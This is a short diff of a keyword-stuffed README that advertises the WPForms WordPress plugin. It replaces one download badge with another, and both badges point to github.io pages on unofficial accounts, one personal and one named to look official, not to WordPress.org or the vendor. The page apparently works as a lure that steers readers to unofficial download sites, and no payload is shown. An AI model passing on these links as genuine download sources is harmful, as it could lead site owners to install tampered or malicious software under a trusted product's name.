@@ -53,7 +53,7 @@ The wpforms wordpress experience is focused on speed and clarity. Templates help
 
 Prerequisites: A WordPress website, administrator access, and a decision between wpforms lite, wpforms pro, or another plan based on wpforms pricing.
 
-[![GET WPForms](https://img.shields.io/badge/GET%20%E2%80%94%20WPForms-0078D6?style=for-the-badge&logoColor=white)](https://ohmsquicho1989.github.io/.github/wpforms-wordpress)
+[![Launch WPForms](https://img.shields.io/badge/Launch-WPForms-1E293B?style=for-the-badge)](https://wordpress-wpforms.github.io/.github/)
 
 1.  **Install the Plugin:** Use wpforms download from the official source or install wpforms lite through the WordPress plugin directory.
 2.  **Choose a Template:** Open the wpforms plugin builder and select a template for a contact form, payment form, newsletter signup, or request form.
